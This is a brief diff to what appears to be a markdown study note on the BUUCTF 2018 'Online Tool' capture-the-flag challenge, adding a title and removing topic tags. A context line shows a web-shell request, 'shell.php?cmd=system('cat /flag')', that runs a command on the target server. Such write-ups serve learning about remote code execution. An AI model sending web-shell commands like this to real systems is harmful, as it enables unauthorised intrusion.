@@ -1,3 +1,4 @@
+# [BUUCTF 2018]Online Tool（学习）
 ![](<./img/Pasted image 20221113171258.png>)
 ```php
 <?php
@@ -76,5 +77,3 @@ OUTPUT:
 /xxx/shell.php?cmd=system('cat /flag');
 ```
 ![](<./img/Pasted image 20221113194826.png>)
-
-#Web #PHP #RCE #shell
